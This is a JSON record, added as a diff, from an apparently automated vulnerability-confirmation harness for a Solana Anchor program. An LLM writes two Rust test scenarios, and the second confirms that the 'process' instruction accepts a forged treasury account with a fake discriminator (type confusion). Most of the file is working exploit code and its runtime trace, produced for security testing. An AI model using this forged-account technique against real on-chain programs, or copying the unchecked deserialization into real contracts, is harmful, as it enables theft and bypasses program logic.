@@ -1,0 +1,91 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e efeitos verificados: process accepted a fake treasury account (COSPLAY)",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2104,
+        "completion_tokens": 697,
+        "latency_s": 3.67
+      },
+      "raw": "{\n  \"plan\": \"Preparamos uma conta Treasury legítima via initialize (baseline) e, em seguida, criamos uma conta falsa cujo layout imita Treasury mas pertence a outro programa (ou tem discriminador diferente), com is_active=true. No ataque, passamos essa conta falsa como `treasury` para `process`, que não valida o discriminador. O efeito medido é que a instrução aceita a conta de outro tipo (COSPLAY), confirmando a vulnerabilidade.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet treasury = Pubkey::new_unique();\\n\\n// Baseline: inicializa uma Treasury legítima\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(1000u64,),\\n    vec![\\n        AccountMeta::new(treasury, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(system_program::ID, false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (treasury, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\nlet baseline_result = env.baseline(\\\"initialize treasury\\\", &init_ix, &init_accounts);\\nassert!(baseline_result.program_result == ProgramResult::Success);\\n\\n// Conta falsa: mesmo layout de Treasury, mas com discriminador de outro tipo\\nlet fake_treasury = Pubkey::new_unique();\\nlet mut fake_data = vec![0u8; 8 + 32 + 8 + 1];\\nfake_data[0..8].copy_from_slice(&[0xAA; 8]); // discriminador falso\\nfake_data[8..40].copy_from_slice(authority.as_ref());\\nfake_data[40..48].copy_from_slice(&500u64.to_le_bytes());\\nfake_data[48] = 1; // is_active = true\\nlet fake_account = account(&env.program_id, &fake_data, None);\\n\\n// Ataque: process com a conta falsa\\nlet attack_ix = env.anchor_ix(\\n    \\\"process\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new_readonly(fake_treasury, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (fake_treasury, fake_account),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"process with fake treasury\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    env.effect(\\n        \\\"process accepted a fake treasury account (COSPLAY)\\\",\\n        true,\\n    );\\n} else {\\n    env.effect(\\n        \\\"process rejected the fake treasury account\\\",\\n        false,\\n    );\\n}\"\n}",
+      "plan": "Preparamos uma conta Treasury legítima via initialize (baseline) e, em seguida, criamos uma conta falsa cujo layout imita Treasury mas pertence a outro programa (ou tem discriminador diferente), com is_active=true. No ataque, passamos essa conta falsa como `treasury` para `process`, que não valida o discriminador. O efeito medido é que a instrução aceita a conta de outro tipo (COSPLAY), confirmando a vulnerabilidade.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet treasury = Pubkey::new_unique();\n\n// Baseline: inicializa uma Treasury legítima\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &(1000u64,),\n    vec![\n        AccountMeta::new(treasury, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(system_program::ID, false),\n    ],\n);\nlet init_accounts = vec![\n    (treasury, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\nlet baseline_result = env.baseline(\"initialize treasury\", &init_ix, &init_accounts);\nassert!(baseline_result.program_result == ProgramResult::Success);\n\n// Conta falsa: mesmo layout de Treasury, mas com discriminador de outro tipo\nlet fake_treasury = Pubkey::new_unique();\nlet mut fake_data = vec![0u8; 8 + 32 + 8 + 1];\nfake_data[0..8].copy_from_slice(&[0xAA; 8]); // discriminador falso\nfake_data[8..40].copy_from_slice(authority.as_ref());\nfake_data[40..48].copy_from_slice(&500u64.to_le_bytes());\nfake_data[48] = 1; // is_active = true\nlet fake_account = account(&env.program_id, &fake_data, None);\n\n// Ataque: process com a conta falsa\nlet attack_ix = env.anchor_ix(\n    \"process\",\n    &(),\n    vec![\n        AccountMeta::new_readonly(fake_treasury, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet attack_accounts = vec![\n    (fake_treasury, fake_account),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"process with fake treasury\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    env.effect(\n        \"process accepted a fake treasury account (COSPLAY)\",\n        true,\n    );\n} else {\n    env.effect(\n        \"process rejected the fake treasury account\",\n        false,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n  --> tests/attempt.rs:15:9\n   |\n13 |     let init_ix = env.anchor_ix(\n   |                       --------- arguments to this method are incorrect\n14 |         \"initialize\",\n15 |         &(1000u64,),\n   |         ^^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:42:9\n   |\n40 |     let attack_ix = env.anchor_ix(\n   |                         --------- arguments to this method are incorrect\n41 |         \"process\",\n42 |         &(),\n   |         ^^^ expected `&[u8]`, found `&()`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&()`\nnote: method defined here\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:15:9\n   |\n13 |     let init_ix = env.anchor_ix(\n   |                       --------- arguments to this method are incorrect\n14 |         \"initialize\",\n15 |         &(1000u64,),\n   |         ^^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:42:9\n   |\n40 |     let attack_ix = env.anchor_ix(\n   |                         --------- arguments to this method are incorrect\n41 |         \"process\",\n42 |         &(),\n   |         ^^^ expected `&[u8]`, found `&()`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&()`\nnote: method defined here\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2912,
+        "completion_tokens": 742,
+        "latency_s": 3.66
+      },
+      "raw": "{\n  \"plan\": \"Inicializo uma Treasury legítima via `initialize` para provar que o cenário está montado corretamente. Em seguida, crio uma conta falsa com o mesmo layout de memória de Treasury (authority, balance, is_active) mas com um discriminador de 8 bytes diferente, representando outro tipo de conta. Chamo `process` passando essa conta falsa como `treasury`; como o programa lê os campos a partir de offsets fixos sem validar o discriminador, a conta falsa é aceita. O efeito medido é que `process` retorna sucesso com uma conta que não é do tipo Treasury, confirmando o COSPLAY.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet treasury = Pubkey::new_unique();\\n\\n// Baseline: inicializa uma Treasury legítima\\nlet init_ix = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &1000u64.to_le_bytes(),\\n    vec![\\n        AccountMeta::new(treasury, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(system_program::ID, false),\\n    ],\\n);\\nlet init_accounts = vec![\\n    (treasury, empty_account()),\\n    (authority, wallet(1_000_000_000)),\\n    system_program_account(),\\n];\\nlet baseline_result = env.baseline(\\\"initialize treasury\\\", &init_ix, &init_accounts);\\nassert!(baseline_result.program_result == ProgramResult::Success);\\n\\n// Conta falsa: mesmo layout de Treasury, mas com discriminador de outro tipo\\nlet fake_treasury = Pubkey::new_unique();\\nlet mut fake_data = vec![0u8; 8 + 32 + 8 + 1];\\nfake_data[0..8].copy_from_slice(&[0xAA; 8]); // discriminador falso\\nfake_data[8..40].copy_from_slice(authority.as_ref());\\nfake_data[40..48].copy_from_slice(&500u64.to_le_bytes());\\nfake_data[48] = 1; // is_active = true\\nlet fake_account = account(&env.program_id, &fake_data, None);\\n\\n// Ataque: process com a conta falsa\\nlet attack_ix = env.anchor_ix(\\n    \\\"process\\\",\\n    &[],\\n    vec![\\n        AccountMeta::new_readonly(fake_treasury, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet attack_accounts = vec![\\n    (fake_treasury, fake_account),\\n    (authority, wallet(1_000_000_000)),\\n];\\nlet attack_result = env.attack(\\\"process with fake treasury\\\", &attack_ix, &attack_accounts);\\n\\nif attack_result.program_result == ProgramResult::Success {\\n    env.effect(\\n        \\\"process accepted a fake treasury account (COSPLAY)\\\",\\n        true,\\n    );\\n} else {\\n    env.effect(\\n        \\\"process rejected the fake treasury account\\\",\\n        false,\\n    );\\n}\"\n}",
+      "plan": "Inicializo uma Treasury legítima via `initialize` para provar que o cenário está montado corretamente. Em seguida, crio uma conta falsa com o mesmo layout de memória de Treasury (authority, balance, is_active) mas com um discriminador de 8 bytes diferente, representando outro tipo de conta. Chamo `process` passando essa conta falsa como `treasury`; como o programa lê os campos a partir de offsets fixos sem validar o discriminador, a conta falsa é aceita. O efeito medido é que `process` retorna sucesso com uma conta que não é do tipo Treasury, confirmando o COSPLAY.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet treasury = Pubkey::new_unique();\n\n// Baseline: inicializa uma Treasury legítima\nlet init_ix = env.anchor_ix(\n    \"initialize\",\n    &1000u64.to_le_bytes(),\n    vec![\n        AccountMeta::new(treasury, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(system_program::ID, false),\n    ],\n);\nlet init_accounts = vec![\n    (treasury, empty_account()),\n    (authority, wallet(1_000_000_000)),\n    system_program_account(),\n];\nlet baseline_result = env.baseline(\"initialize treasury\", &init_ix, &init_accounts);\nassert!(baseline_result.program_result == ProgramResult::Success);\n\n// Conta falsa: mesmo layout de Treasury, mas com discriminador de outro tipo\nlet fake_treasury = Pubkey::new_unique();\nlet mut fake_data = vec![0u8; 8 + 32 + 8 + 1];\nfake_data[0..8].copy_from_slice(&[0xAA; 8]); // discriminador falso\nfake_data[8..40].copy_from_slice(authority.as_ref());\nfake_data[40..48].copy_from_slice(&500u64.to_le_bytes());\nfake_data[48] = 1; // is_active = true\nlet fake_account = account(&env.program_id, &fake_data, None);\n\n// Ataque: process com a conta falsa\nlet attack_ix = env.anchor_ix(\n    \"process\",\n    &[],\n    vec![\n        AccountMeta::new_readonly(fake_treasury, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet attack_accounts = vec![\n    (fake_treasury, fake_account),\n    (authority, wallet(1_000_000_000)),\n];\nlet attack_result = env.attack(\"process with fake treasury\", &attack_ix, &attack_accounts);\n\nif attack_result.program_result == ProgramResult::Success {\n    env.effect(\n        \"process accepted a fake treasury account (COSPLAY)\",\n        true,\n    );\n} else {\n    env.effect(\n        \"process rejected the fake treasury account\",\n        false,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize treasury",
+            "result": "Success",
+            "compute_units": 12976,
+            "account_flags": "sw,sw,-r"
+          },
+          {
+            "step": "attack",
+            "note": "process with fake treasury",
+            "result": "Success",
+            "compute_units": 8482,
+            "account_flags": "-r,sr"
+          },
+          {
+            "step": "effect",
+            "note": "process accepted a fake treasury account (COSPLAY)",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 12976 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw invoke [1]",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw consumed 8482 of 1400000 compute units",
+          "Program 8anCcUkKVms75R4HYTnkbM6YGzAra9WTmXhNEY5RSaNw success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e efeitos verificados: process accepted a fake treasury account (COSPLAY)"
+    }
+  ],
+  "case_id": "SSP-02-A-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "high",
+    "evidence": "let authority = Pubkey::try_from(&data[8..40])...;\nlet balance = u64::from_le_bytes(data[40..48]...);\nlet is_active = data[48] != 0;",
+    "explanation": "Os dados da conta sao desserializados manualmente a partir de offsets fixos (8..40, 40..48, 48) sem verificar o discriminador de 8 bytes do Anchor no inicio do buffer. Como `treasury` e um `AccountInfo` e nao `Account<'info, Treasury>`, o discriminador de tipo nao e validado, permitindo que uma conta com layout de outro tipo (ou dados arbitrarios) seja interpretada como `Treasury`.",
+    "attack_hypothesis": "Um atacante fornece uma conta cujo layout de memoria coincide parcialmente com `Treasury` (por exemplo, uma conta de outro tipo com os mesmos offsets), fazendo com que os campos lidos (authority, balance, is_active) sejam interpretados incorretamente e burlando a logica de negocio que depende desses valores."
+  }
+}
